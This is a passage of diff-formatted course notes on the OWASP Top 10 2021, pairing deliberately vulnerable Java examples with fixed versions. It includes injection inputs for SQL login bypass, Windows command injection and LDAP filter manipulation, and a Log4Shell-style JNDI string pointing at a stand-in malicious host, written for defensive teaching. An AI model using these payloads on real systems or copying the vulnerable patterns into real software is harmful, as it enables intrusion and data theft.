+        System.out.print("Password: ");
+        String password = scanner.nextLine();
+
+        try {
+            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/demo", "root", "password");
+
+            // ❌ SQL Injection Vulnerability
+            String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
+            Statement stmt = conn.createStatement();
+            ResultSet rs = stmt.executeQuery(sql);
+
+            if (rs.next()) {
+                System.out.println("Login successful (vulnerable).");
+            } else {
+                System.out.println("Login failed.");
+            }
+
+            conn.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+ 
+Try this input to bypass login:
+
+Username: ' OR '1'='1
+Password: anything
+
+✅ 2. SecureLogin.java — PreparedStatement Version
+
+package com.example;
+
+import java.sql.*;
+import java.util.Scanner;
+
+public class SecureLogin {
+    public static void main(String[] args) {
+        Scanner scanner = new Scanner(System.in);
+        System.out.print("Username: ");
+        String username = scanner.nextLine();
+        System.out.print("Password: ");
+        String password = scanner.nextLine();
+
+        try {
+            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/demo", "root", "password");
+
+            // ✅ Secure query using PreparedStatement
+            String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+            PreparedStatement pstmt = conn.prepareStatement(sql);
+            pstmt.setString(1, username);
+            pstmt.setString(2, password);
+            ResultSet rs = pstmt.executeQuery();
+
+            if (rs.next()) {
+                System.out.println("Login successful (secure).");
+            } else {
+                System.out.println("Login failed.");
+            }
+
+            conn.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+🛠️ SQL Setup Script (MySQL)
+
+CREATE DATABASE demo;
+USE demo;
+
+CREATE TABLE users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(255),
+    password VARCHAR(255)
+);
+
+INSERT INTO users (username, password) VALUES ('admin', 'admin123'), ('user', 'pass123');
+
+ 1. Command Injection in Java
+
+Command Injection occurs when an attacker can execute arbitrary system commands on the host OS via a vulnerable application.
+
+❌ Vulnerable Example (User Input in OS Command)
+
+package com.example;
+
+public class CommandInjectionDemo {
+ public static void main(String[] args) {
+     Scanner scanner = new Scanner(System.in);
+     System.out.print("Enter directory to list: ");
+     String dir = scanner.nextLine();
+
+     try {
+         // Vulnerable: input directly passed to system shell
+         String command = "cmd.exe /c dir " + dir;
+         System.out.println("Running: " + command);
+         Process process = Runtime.getRuntime().exec(command);
+
+         BufferedReader reader = new BufferedReader(
+             new InputStreamReader(process.getInputStream())
+         );
+
+         String line;
+         while ((line = reader.readLine()) != null) {
+             System.out.println(line);
+         }
+
+     } catch (Exception e) {
+         e.printStackTrace();
+     }
+ }
+}
+
+
+- Run and provide input as  . & echo HACKED & whoami
+
+- In order to fix it with secure version
+
+public class SafeCommandExecution {
+ public static void main(String[] args) {
+     Scanner scanner = new Scanner(System.in);
+     System.out.print("Enter directory to list: ");
+     String dir = scanner.nextLine();
+
+     // Optional: input validation (disallow special characters)
+     if (dir.contains("&") || dir.contains("|") || dir.contains(";")) {
+         System.out.println("Invalid input. Special characters not allowed.");
+         return;
+     }
+
+     try {
+         // Safe: separates command and argument
+         ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "dir", dir);
+         Process process = builder.start();
+
+         BufferedReader reader = new BufferedReader(
+             new InputStreamReader(process.getInputStream())
+         );
+
+         String line;
+         while ((line = reader.readLine()) != null) {
+             System.out.println(line);
+         }
+
+     } catch (Exception e) {
+         e.printStackTrace();
+     }
+ }
+}
+
+- Run the prg with input: . & echo HACKED    //It will say invalid char
+
+- Run once again and provide proper input as . or C:\Users  //where it display all folder info 																			securely
+
+
+2. LDAP Injection in Java
+LDAP Injection occurs when unsanitized input is embedded directly in LDAP search filters, allowing attackers to:
+
+Bypass authentication
+Access unauthorized records
+Manipulate search filters
+
+public class LdapInjectionDemo {
+
+ public static void main(String[] args) {
+     Scanner scanner = new Scanner(System.in);
+     System.out.print("Enter username to search: ");
+     String userInput = scanner.nextLine();
+
+     //  Vulnerable: user input directly injected into filter
+     String filter = "(uid=" + userInput + ")";
+     System.out.println("Generated LDAP filter: " + filter);
+
+     // Simulate query (we're not querying a real server)
+     if (filter.contains("*)")) {
+         System.out.println("LDAP Injection Detected! (Simulated Access to All Records)");
+     } else {
+         System.out.println("Searching directory for user: " + userInput);
+     }
+ }
+}
+
+- Run prg with input *) (|(uid=*))  //This manipulates the search to return all user entries in a real LDAP system.
+
+- Secure version
+
+public class SafeLdapSearch {
+
+    // Escapes special characters: \ * ( ) \0
+    public static String escapeLDAP(String input) {
+        return input.replace("\\", "\\\\")
+                    .replace("*", "\\2a")
+                    .replace("(", "\\28")
+                    .replace(")", "\\29")
+                    .replace("\u0000", "");
+    }
+
+    public static void main(String[] args) {
+        Scanner scanner = new Scanner(System.in);
+        System.out.print("Enter username to search: ");
+        String userInput = scanner.nextLine();
+
+        //  Escape unsafe characters
+        String safeInput = escapeLDAP(userInput);
+        String filter = "(uid=" + safeInput + ")";
+        System.out.println("Generated safe LDAP filter: " + filter);
+
+        System.out.println("Searching directory securely for user: " + safeInput);
+    }
+}
+
+- Run prg with input *) (|(uid=*))  //it will escape safely
+
+
+
+4. A04:2021 – Insecure Design
+
+This is new category on 2021 and focuses on the risks that are related to design and architectural flaws 
+        So secure design can still have a problematic implementation or defects related to implementation that leads to vulnerabilities, but this is insecure design which cannot be fixed by a perfect implementation 
+      Consider we are building an appl, prior to building we want to think about the architectural componentsy, how we are going to design and think about how to roll in security into that before even start writing ur first line of code 
+      We have a movie theatre and we have an online appl where people can buy tickets, so they can come into ur appl and buy their tickets. Lets say in ur appl we want all these people to come ur theatre so we offer some kind of bulk discount and say that if there is less than 15 tickets so we can reserve those on this appl. So attackers take advantage of the design, so ur appl is amazing applin the sense it runs very fast, so basically attacker have taken advantage of an insecure design in the appl itself so attacker will buy out or reserve all the tickets and effectively block out any kind of a normal user to watch the movie
+    So secure design is a methodology that constantly evaluates threats and ensures that code is robustly designed and tested to prevent attack methods in ur appl. So secure software requires some sort of secure development lifecycle or secure design pattern or secure component libraries or tools. We also reach out security specialist throughout the whole project and throughout the maintainence of the software, so incorporate security team throughout the entire lifecycle of this code. We use threat modeling for critical authentication, access control and business logic and key flows that going through the appl. Next we need to write test to validate all the critical flows through the threat model. We need to compile use cases but also missed use cases for every tier of appl, so when we do the testing we dont need to just test the appl to works but we need to do a misuse case also 
+
+A04:2021 – Insecure Design is a new category introduced in the OWASP Top 10 – 2021 that focuses on security weaknesses due to flawed application architecture, threat modeling gaps, or insecure business logic.
+
+Unlike vulnerabilities that arise from poor coding practices (like injection or XSS), Insecure Design refers to weaknesses that are built into the system before a single line of code is written.
+
+What is Insecure Design?
+Insecure Design is about missing or ineffective security controls resulting from:
+
+Lack of secure design patterns.
+Absence of threat modeling or misuse-case analysis.
+Business logic that can be manipulated or abused.
+Failure to define proper security requirements during the design phase.
+
+Examples of Insecure Design
+Scenario	Description
+❌ No Rate Limiting	 - Allows brute-force login attempts.
+❌ No MFA (Multi-Factor Auth) -	Critical operations are protected only by password.
+❌ Skipping threat modeling -	Leads to assumptions that attackers won’t abuse flows.
+❌ Exposing sensitive features - 	Admin functions are visible or accessible in the UI.
+❌ Poor workflow validation -	For example, skipping approval steps in purchase flows.
+
+ Why Insecure Design is Dangerous
+It can’t be fixed just by patching code — it requires architectural changes.
+It's expensive to fix late, especially in production systems.
+Leaves systems open to business logic abuse (e.g., bypassing payment, duplicating transactions, etc.)
+
+How to Prevent Insecure Design
+✅ Secure-by-design principles	Integrate security into SDLC and design reviews.
+✅ Threat modeling	Identify abuse cases early in the design.
+✅ Secure design patterns	Follow patterns like least privilege, fail secure, separation of duties.
+✅ Limit exposure	Hide critical flows and functions from unauthorized users.
+✅ Enforce workflows	Build strict checks into business logic (e.g., approval steps, role-based paths).
+✅ Code & design reviews	Include abuse case reviews, not just functional correctness.
+
+🔐 Real-World Example
+Scenario: Banking app allows money transfers but lacks OTP or 2FA.
+
+Attacker gets access to credentials → transfers funds without any challenge.
+Problem: No second factor or transaction verification.
+🧨 This is not a bug, it’s a flaw in the system’s design.
+
+Scenario: Purchase Order System
+Users submit purchase requests.
+Managers must approve purchases over a certain amount (e.g., $1,000).
+If the design is insecure, anyone can bypass the approval check.
+
+🔓 1. Insecure Design: Approval Logic Bypassed
+
+package com.example;
+
+public class PurchaseService {
+    public static void main(String[] args) {
+        String userRole = args[0];         // e.g. "user" or "manager"
+        double amount = Double.parseDouble(args[1]);  // e.g. 1500
+
+        // ❌ Insecure: no approval needed for high-value purchases
+        createPurchase(userRole, amount);
+    }
+
+    public static void createPurchase(String userRole, double amount) {
+        // Missing approval step
+        System.out.printf("Purchase of $%.2f created by %s – STATUS: approved%n", amount, userRole);
+    }
+}
+
+Issue: A normal user ("user") can create a purchase of any amount, and it's incorrectly approved due to missing business logic.
+
+🛡️ 2. Secure Design: Enforce Approval for Large Orders
+
+package com.example;
+
+import java.util.Scanner;
+
+public class PurchaseService {
+    private static final double APPROVAL_THRESHOLD = 1000.00;
+
+    public static void main(String[] args) {
+        Scanner sc = new Scanner(System.in);
+        System.out.print("Role (user/manager): ");
+        String role = sc.nextLine();
+        System.out.print("Purchase Amount: ");
+        double amount = Double.parseDouble(sc.nextLine());
+
+        createPurchase(role, amount);
+    }
+
+    public static void createPurchase(String userRole, double amount) {
+        String status="pending manager approval";
+
+        if (amount > APPROVAL_THRESHOLD) {
+            if ("manager".equals(userRole)) {
+                status = "approved";
+            } 
+        } 
+
+        System.out.printf("Purchase of $%.2f by %s – STATUS: %s%n", amount, userRole, status);
+    }
+}
+
+Improvements:
+Defines a clear workflow: large amounts require manager approval.
+Enforces roles and thresholds.
+
+Why This Illustrates Insecure Design
+Insecure version: lacks necessary business logic—any user can approve any purchase.
+It's a design flaw, not a coding bug.
+Secure version: integrates a multi-step workflow based on roles and thresholds.
+
+🛡️ Other Real-World Insecure Design Examples
+No rate limiting on login flows → credential stuffing.
+Missing 2FA on critical actions (password change, fund transfers).
+Admin actions exposed in UI or API without separation.
+Predictable payment logic allowing users to skip payment by altering client code.
+
+
+ 1. No Logging for Security Events
+❌ Insecure Design: No Logging
+
+package com.example;
+
+public class NoLoggingExample {
+    public static void main(String[] args) {
+        String username = args.length > 0 ? args[0] : "admin";
+        String password = args.length > 1 ? args[1] : "guess123";
+
+        if ("admin".equals(username) && "admin123".equals(password)) {
+            System.out.println("Login successful");
+        } else {
+            //  No logging of failed attempts
+            System.out.println("Login failed");
+        }
+    }
+}
+
+✅ Secure Version: Logs Failed Logins
+
+package com.example;
+
+import java.util.logging.*;
+
+public class LoggingExample {
+    private static final Logger logger = Logger.getLogger(LoggingExample.class.getName());
+
+    public static void main(String[] args) {
+        String username = args.length > 0 ? args[0] : "admin";
+        String password = args.length > 1 ? args[1] : "guess123";
+
+        if ("admin".equals(username) && "admin123".equals(password)) {
+            System.out.println("Login successful");
+        } else {
+            logger.warning("Failed login attempt for user: " + username);
+            System.out.println("Login failed");
+        }
+    }
+}
+
+🌐 2. Exposed Admin API Without Access Controls
+❌ Insecure Design: No Access Check
+
+package com.example;
+
+public class AdminAPI {
+    public static void main(String[] args) {
+        System.out.println("Resetting all user passwords..."); // No role check
+    }
+}
+Any user who finds this endpoint (e.g., /admin/reset) can trigger it.
+
+✅ Secure Version: Role-Based Check
+
+package com.example;
+
+public class SecureAdminAPI {
+    public static void main(String[] args) {
+        String role = args.length > 0 ? args[0] : "user";
+
+        if (!"admin".equalsIgnoreCase(role)) {
+            System.out.println("Access denied: Not an admin");
+            return;
+        }
+
+        System.out.println("Resetting all user passwords..."); // Protected
+    }
+}
+
+🔁 3. Missing Workflow Check (Business Logic Flaw)
+❌ Insecure: Skips Approval Step
+
+package com.example;
+
+public class WorkflowBypass {
+    public static void main(String[] args) {
+        double amount = 5000;
+
+        // ❌ Skipping manager approval
+        System.out.println("Loan approved for amount: " + amount);
+    }
+}
+
+✅ Secure: Enforces Workflow
+
+package com.example;
+
+public class SecureWorkflow {
+    public static void main(String[] args) {
+        String role = args.length > 0 ? args[0] : "user";
+        double amount = 5000;
+
+        if (amount > 1000 && !"manager".equalsIgnoreCase(role)) {
+            System.out.println("Loan approval requires manager.");
+        } else {
+            System.out.println("Loan approved for amount: " + amount);
+        }
+    }
+}
+
+
+5. A05:2021 - Security Misconfiguration
+
+So we have security components within ur appl but they are not configured correctly like we didnt change the default password 
+         So couple of things to look for to know if ur appl might be vulnerable is if unnecessary features are enabled or installed, if default accounts and their passwords are still unchanged, maybe latest security features are disabled if we do an upgrade on ur software, maybe ur appl server is not sending security headers or they are not set to secure values, maybe the software taht we are running is out of date or vulnerable 
+     Consider we have an appl and have designed securely but the software that is used to run this appl is misconfigured or we have appl server that ur appl is running on, that appl server comes with some sample appl and that appl is not removed when we install ur appl, and ur sample appl has some kind of known vulnerability. Now the attacker comes after sample appl and going to exploit these known vulnerability, for example default accounts are not changed, default password are well known in sample appl then the attacker can login with those default passwords and then take over the appl. So thats a problem so that would be a misconfiguration of security so now we need to remove of whole sample appl from the app server 
+     Another scenario is when u r running an appl and its designed correctly, we have an error message that gets sent to the user whenever there is some sort of error, which includes all of the information, maybe as appl developer we are trying to give all the info about the error that we are experienced on my appl, where we are opening door for an attacker to knowingly create an error message and they start looking at all of these detail info and use that info and try to attack some sort of vulnerability that we have in appl. If there is too much detail in error message that could be a security misconfiguration 
+     To wrap up in ur appl we have a minimal platform with least privilege that removes any kind of unnecessary features or components or documentation or samples 
+
+Security misconfiguration refers to improper configuration of security controls or the failure to configure them altogether. This includes everything from default settings, unnecessary features, overly verbose error messages, to improperly configured permissions.
+
+Common Examples of Security Misconfiguration
+1. Default credentials left unchanged (e.g., admin/admin).
+2. Unnecessary services enabled (e.g., debug mode in production).
+3. Directory listing enabled on web servers.
+4. Error messages that reveal stack traces or server details.
+5. Cloud storage buckets with public read/write access.
+6. Missing security headers (like X-Content-Type-Options, X-Frame-Options, etc.).
+7. Unpatched systems or using outdated libraries/frameworks.
+8. Open ports or services not intended to be exposed to the internet.
+
+Potential Impacts
+1. Unauthorized access to sensitive data
+2. System compromise (e.g., remote code execution)
+3. Exposure of internal system details aiding further attacks
+4. Denial of Service (DoS)
+
+How to Prevent Security Misconfiguration
+1. Harden all environments: Disable unnecessary services and features.
+2. Change default credentials immediately after installation.
+3. Apply the principle of least privilege to users and services.
+4. Automate environment configuration using Infrastructure-as-Code (IaC) tools (like Terraform, Ansible).
+5. Conduct regular scans and audits for misconfigurations (e.g., OWASP ZAP, Nessus).
+6. Set up proper error handling: Avoid showing stack traces or detailed errors to end users.
+7. Use secure headers to enforce security policies on clients.
+8. Keep systems and dependencies updated with patches.
+
+Scenario: Stack Trace Exposure via Exception
+✅ Good Practice:
+Log exceptions internally
+Show a generic error message to users
+
+❌ Misconfigured (Bad) Practice:
+Show full stack trace in the browser
+
+Demo: Java Servlet That Exposes Stack Trace (Vulnerable)
+
+SecurityMisconfigDemo/
+├── src/
+│   └── com.example/
+│       └── ErrorServlet.java
+├── WebContent/
+│   ├── index.html
+│   └── WEB-INF/
+│       └── web.xml
+
+📄 ErrorServlet.java
+
+package com.example;
+
+import java.io.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+public class ErrorServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        PrintWriter out = response.getWriter();
+        response.setContentType("text/html");
+
+        try {
+            // Simulate some processing
+            int result = 10 / 0; // Will cause ArithmeticException
+            out.println("Result: " + result);
+        } catch (Exception e) {
+            // ❌ Bad Practice: exposing internal error details
+            e.printStackTrace(out); // Exposed to user
+        }
+    }
+}
+
+
+🧪 Accessing http://localhost:8080/SecurityMisconfigDemo/error
+Output:
+
+java.lang.ArithmeticException: / by zero
+    at com.example.ErrorServlet.doGet(ErrorServlet.java:12)
+    ...
+⚠️ Revealing exact line numbers and internal class names to attackers!
+
+✅ Fix (Secure Version)
+
+catch (Exception e) {
+    // ✅ Good Practice: log internally, show generic message
+    log("Internal error occurred", e);
+    out.println("Something went wrong. Please try again later.");
+}
+
+OWASP Tips:
+Disable stack traces in production (<error-page> in web.xml)
+Use error-handling frameworks (e.g., Spring Boot’s @ControllerAdvice)
+Log securely (never log sensitive data)
+Return HTTP status codes appropriately
+
+
+6. A06:2021 – Vulnerable and Outdated Components
+
+This moves up from number 9 on 2017 list to number 6
+       Consider we have an appl which is composed of many different components and that contains different libraries, so ur appl relies on 3rd party libraries or variety of external components that we bring together to build ur appl. When attackers are looking at the appl as wht type of components they made up of and what kind of libraries are in this appl
+   So to know if ur appl is vulnerable we need to know all the different versions of all the components that we use both client side and server side, so if the software is vulnerable or unsupported or out-of-date then ur appl is vulnerable 
+   If we dont scan for vulnerabilities regularly or like subscribe for security then we are vulnerable. If we dont fix or upgrade the underlying platforms or frameworks then we are proably vulnerable. If software developers who develop ur appl, if they dont test the compatibility of the updated or upgraded or patched libraries then we may vulnerable
+     So to secure urself we need to remove any know of unused dependency, unnecesary features, unnecessary components. OWASP has a project called dependency check and it is very useful to run against ur appl to tell there is any unused or unnecessary dependencies. Next we need to continuously inventory the versions of both client side and server side components to see what u r running and we only need to use components from official sources over secure links, so dont and get some unverified component 
+    We also need to monitor for libraries and components that are unmaintained or dont create security patches for older versions 
+
+        It highlights the dangers of using components (libraries, frameworks, platforms) with known vulnerabilities or that are no longer maintained.
+
+What is It?
+It refers to using software components that:
+Have known security vulnerabilities
+Are no longer supported or updated
+Are improperly configured, or
+Have outdated versions deployed in production
+
+This applies to:
+Application libraries (e.g., Log4j, Jackson)
+Operating systems (e.g., unpatched Linux)
+Web/app servers (e.g., Apache Tomcat)
+Database management systems
+Client-side components (e.g., jQuery, React)
+
+Real-World Examples
+Log4Shell (Log4j): Critical RCE vulnerability in Log4j (CVE-2021-44228)
+Struts2 RCE: Apache Struts vulnerability led to the Equifax data breach
+Old jQuery versions vulnerable to XSS
+Using outdated Spring Boot versions with known deserialization flaws
+
+Why Is This Dangerous?
+Attackers scan for known vulnerable components
+Exploits are easily available in public repositories (like Exploit DB)
+Can lead to:
+  Remote Code Execution (RCE)
+  Data breaches
+  Denial of Service (DoS)
+  Complete system compromise
+
+How to Prevent It
+Inventory-Maintain a bill of materials (SBOM) for all components
+Use Tools - Run tools like OWASP Dependency-Check, Snyk, or GitHub Dependabot
+Patch Regularly - 	Apply updates and security patches frequently
+Monitor Sources	 - Track CVEs (Common Vulnerabilities and Exposures) for components
+Minimal Use	- Only include libraries you actually use
+Automate - Use CI/CD tools to automate security scanning of dependencies
+
+Example: Vulnerable Dependency in Java (log4j 1.x)
+
+<!-- pom.xml -->
+<dependency>
+    <groupId>log4j</groupId>
+    <artifactId>log4j</artifactId>
+    <version>1.2.17</version> <!-- Vulnerable! -->
+</dependency>
+
+This version is known to be susceptible to RCE and no longer maintained.
+
+Mitigation
+Replace with updated dependency:
+
+<!-- Safe alternative -->
+<dependency>
+    <groupId>org.apache.logging.log4j</groupId>
+    <artifactId>log4j-core</artifactId>
+    <version>2.20.0</version>
+</dependency>
+
+Use OWASP tools:
+OWASP Dependency-Check
+OWASP CycloneDX
+
+
+Here's a simple Java code example that demonstrates A06:2021 - Vulnerable and Outdated Components, specifically using an outdated and vulnerable version of Log4j (1.2.17), which has known Remote Code Execution (RCE) vulnerabilities.
+
+ Vulnerable Java Example using Log4j 1.2.17
+ Project Structure:
+
+VulnerableDependencyDemo/
+├── pom.xml
+└── src/
+    └── main/
+        └── java/
+            └── com/
+                └── example/
+                    └── VulnerableApp.java
+
+📄 pom.xml – with vulnerable dependency
+
+<project xmlns="http://maven.apache.org/POM/4.0.0" 
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
+         http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.example</groupId>
+    <artifactId>VulnerableDependencyDemo</artifactId>
+    <version>1.0-SNAPSHOT</version>
+
+    <dependencies>
+        <!-- ❌ Vulnerable log4j version -->
+        <dependency>
+            <groupId>log4j</groupId>
+            <artifactId>log4j</artifactId>
+            <version>1.2.17</version>
+        </dependency>
+    </dependencies>
+</project>
+
+📄 VulnerableApp.java
+
+package com.example;
+
+import org.apache.log4j.Logger;
+
+public class VulnerableApp {
+    static Logger logger = Logger.getLogger(VulnerableApp.class);
+
+    public static void main(String[] args) {
+        logger.info("Application started");
+        System.out.println("Running Vulnerable Application");
+
+        // Simulate user input being logged (potentially dangerous)
+        String userInput = "${jndi:ldap://malicious.server/exploit}"; // Log4Shell-style payload
+        logger.error("Received input: " + userInput);
+    }
+}
+
+ What Makes It Vulnerable?
+The code uses Log4j 1.2.17, which has known deserialization vulnerabilities and may be exploitable via manipulated input.
+Logging untrusted user input can lead to RCE (as seen in the Log4Shell attack on Log4j 2.x).
+OWASP classifies this under A06:2021 due to using components with known CVEs.
+
+✅ How to Fix It
+Update to the latest version of Log4j (e.g., 2.20+):
+
+<dependency>
+    <groupId>org.apache.logging.log4j</groupId>
+    <artifactId>log4j-core</artifactId>
+    <version>2.20.0</version>
+</dependency>
+Avoid logging raw user input without sanitization.
+
+Use tools like:
+OWASP Dependency-Check
+Snyk
+GitHub Dependabot
+
+✅ Secure Java Project Example for A06:2021
+
+- Create new maven project
+
+📄 pom.xml – using Log4j 2.20.0
+
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
+         http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.example</groupId>
+    <artifactId>SecureDependencyDemo</artifactId>
+    <version>1.0-SNAPSHOT</version>
+
+    <properties>
+        <log4j2.version>2.20.0</log4j2.version>
+         <java.version>21</java.version>
+    </properties>
+
+    <dependencies>
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-api</artifactId>
+            <version>${log4j2.version}</version>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-core</artifactId>
+            <version>${log4j2.version}</version>
+        </dependency>
+    </dependencies>
+</project>
+
+📄 SecureApp.java
+
+package com.example;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class SecureApp {
+    private static final Logger logger = LogManager.getLogger(SecureApp.class);
+
+    public static void main(String[] args) {
+        logger.info("Application started securely");
+        System.out.println("Running Secure Application");
+
+        // Simulated sanitized user input
+        String userInput = "user input";
+        logger.info("Received input: {}", userInput);
+    }
+}
+
+✅ This version:
+Uses Log4j 2.20.0, which is actively maintained and patched.
+Uses parameterized logging ({}) to safely log input.
+Avoids insecure patterns that could lead to RCE or info leaks.
+
+
+Here’s a step-by-step guide to run OWASP Dependency-Check on your Java Maven project and generate a security report showing whether any libraries are vulnerable (including outdated ones like Log4j 1.x).
+
+Running OWASP Dependency-Check in Java (Maven)
+Step 1: Install OWASP Dependency-Check
+
+As a Maven Plugin (recommended for Java)
+
+
+<build>
+  <plugins>
+    <plugin>
+      <groupId>org.owasp</groupId>
+      <artifactId>dependency-check-maven</artifactId>
+      <version>8.4.0</version> <!-- Use the latest available -->
+      <executions>
+        <execution>
+          <goals>
+            <goal>check</goal>
+          </goals>
+        </execution>
+      </executions>
+    </plugin>
+  </plugins>
+</build>
+
+ Step 2: Run the Dependency-Check Report
+Run the following command from your project directory (where pom.xml is located):
+
+mvn verify
+
+💡 This will:
+
+Analyze all dependencies
+Compare them against the NVD (National Vulnerability Database)
+Generate a detailed HTML report
+
+📄 Step 3: View the Report
+The report is typically generated in:
+
+target/dependency-check-report.html
+
+Open it in a browser to review:
+
+Known CVEs for each dependency
+
+Severity levels (CVSS scores)
+
+Suggestions for version upgrades
+
+🧪 Example Output
+Dependency	CVE ID	Severity	Description
+log4j:1.2.17	CVE-2019-17571	High	Deserialization RCE in SocketServer
+jackson-databind	CVE-2018-19362	Medium	Unsafe polymorphic typing
+
+🧼 Tips for Fixing Vulnerabilities
+Update dependencies in pom.xml to safe versions
+
+Use parameterized logging and avoid dynamic class loading
+
+Regularly re-run the tool (automate in CI/CD)
+
+
+7. A07:2021 – Identification and Authentication Failures
+
+Previously known as broken authentication and come down from the list, it was 2nd in 2017 list but now it is 7th position 
+      We have an appl and we got users that want to access ur appl and there needs to be some kind of authentication mechanism that happens to make sure the user is authenticated, so if it is broken or misused then we got the problem. So if the appl itself permits things like credential attack where the attackers have valid usernames and password it could be a problem, if the appl is built in such a way that it permits brute force or other automated attacks then it could be a problem or if ur password policy on ur appl permits weak or default or wellknown passwords which is also not good. Also the password recovery like credential recovery or forgot password process like knowledge base answers like what is mothers maiden name, so those answers can be found out and it could be an unsafe method of password and it is not safe 
+      Next one is session timeout, we have public library where we read books and improving urself, when u sit on the computer there and do all ur work and then instead of logging out of computer we just close the browser tab. If someone comes and sit on same computer then it is open for them to steal that session and start to use that. So if the appl that u had been accessing dosent have proper timeouts then every user can use ur session 
+    To protect against this, wherever possible we need to implement multi-factor authentication so we can prevent some of credential stuffing problem (ie) someone stolen ur credentials and get reused. Next implement password checks on ur appl so test for new passwords or change passwords and not allow user to enter previous passwords. We can align ur password length, complexity and rotation policy against strong passwords. We can use server side secure built-in session managers that generate a new random session id after login and session id also should not be in url and we need to invalidate after logout 
+
+      It focuses on weaknesses in login mechanisms and identity management.
+
+What Is It?
+This category covers flaws in authentication mechanisms, such as:
+1. Failing to properly authenticate users
+2. Using weak or predictable credentials
+3. Not protecting authentication tokens
+4. Implementing custom, insecure login logic
+
+These flaws can lead to unauthorized access, identity spoofing, and complete account takeover.
+
+🔓 Common Examples
+Weak/default credentials - admin/admin, 123456 still allowed
+Brute force vulnerable login - 	No rate-limiting or CAPTCHA
+Broken session management	- Session IDs not rotated on login
+Exposed authentication tokens -	Tokens in URL, no expiration
+Missing multi-factor authentication (MFA)	- Only password-based authentication
+Insecure password storage -	Plaintext or weak hash like MD5
+Improper JWT validation - Missing signature or using none algorithm
+No account lockout after failed attempts -	Easy brute force or credential stuffing
+
+Potential Impacts
+1. Account compromise
+2. Unauthorized data access
+3. Privilege escalation
+4. Business logic abuse (e.g., using another user’s account)
+
+How to Prevent It
+1. Enforce strong passwords- Minimum length, complexity rules
+2. Use Multi-Factor Authentication	-Especially for sensitive operations
+3. Store passwords securely -	Use bcrypt, scrypt, or Argon2
+4. Limit login attempts -	Add lockouts, rate limiting, CAPTCHA
+5. Rotate session IDs on login	-Prevent session fixation
+6. Implement secure token handling	- Use HTTP-only, secure cookies
+7. Validate JWTs properly	- Reject unsigned or weakly signed tokens
+
+Java Example: Insecure Login Logic
+
+// ⚠️ BAD PRACTICE: No password hashing, no brute-force protection
+if (username.equals(inputUsername) && password.equals(inputPassword)) {
+    // logged in
+    session.setAttribute("user", username);
+}
+
+✅ Java Secure Login Practice (Spring Security-style)
+
+// Store passwords securely (e.g., hashed with bcrypt)
+String hashedPassword = passwordEncoder.encode(userInput);
+
+// Compare securely
+if (passwordEncoder.matches(rawPassword, storedHash)) {
+    // authenticated
+}
+
+Use frameworks like Spring Security, which handle:
+Session fixation protection
+Secure cookie management
+CSRF protection
+Brute-force prevention (with plugins)
+
+
+
+Here’s the complete Java servlet-based project demonstrating A07:2021 – Identification and Authentication Failures, including:
+
+❌ A vulnerable login servlet (plaintext passwords, no protection)
+✅ A secure login servlet (bcrypt hashing, session management)
+
+🗂️ Project Structure
+
+AuthFailuresDemo/
+├── src/
+│   └── com/
+│       └── example/
+│           ├── VulnerableLoginServlet.java
+│           └── SecureLoginServlet.java
+├── WebContent/
+│   ├── index.html
+│   └── WEB-INF/
+│       └── web.xml
+
+📄 VulnerableLoginServlet.java
+
+package com.example;
+
+import java.io.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+public class VulnerableLoginServlet extends HttpServlet {
+    protected void doPost(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String username = request.getParameter("username");
+        String password = request.getParameter("password");
+
+        PrintWriter out = response.getWriter();
+        response.setContentType("text/html");
+
+        // ❌ Insecure: hardcoded, no hashing, no brute-force protection
+        if ("admin".equals(username) && "admin123".equals(password)) {
+            HttpSession session = request.getSession();
+            session.setAttribute("user", username);
+            out.println("Login successful (Vulnerable)");
+        } else {
+            out.println("Login failed");
+        }
+    }
+}
+
+📄 SecureLoginServlet.java
+✅ Requires jBCrypt library: org.mindrot.jbcrypt.BCrypt
+
+package com.example;
+
+import java.io.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+import java.util.HashMap;
+import org.mindrot.jbcrypt.BCrypt;
+
+public class SecureLoginServlet extends HttpServlet {
+    private static final HashMap<String, String> userStore = new HashMap<>();
+
+    public void init() {
+        // Store a bcrypt-hashed password
+        String hashedPassword = BCrypt.hashpw("admin123", BCrypt.gensalt());
+        userStore.put("admin", hashedPassword);
+    }
+
+    protected void doPost(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String username = request.getParameter("username");
+        String password = request.getParameter("password");
+
+        PrintWriter out = response.getWriter();
+        response.setContentType("text/html");
+
+        if (userStore.containsKey(username)) {
+            String storedHash = userStore.get(username);
+            if (BCrypt.checkpw(password, storedHash)) {
+                HttpSession session = request.getSession();
+                session.invalidate(); // Prevent session fixation
+                session = request.getSession(true);
+                session.setAttribute("user", username);
+                out.println("Login successful (Secure)");
+                return;
+            }
+        }
+        out.println("Login failed");
+    }
+}
+
+📄 web.xml (Servlet Configuration)
+
+<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0">
+    <servlet>
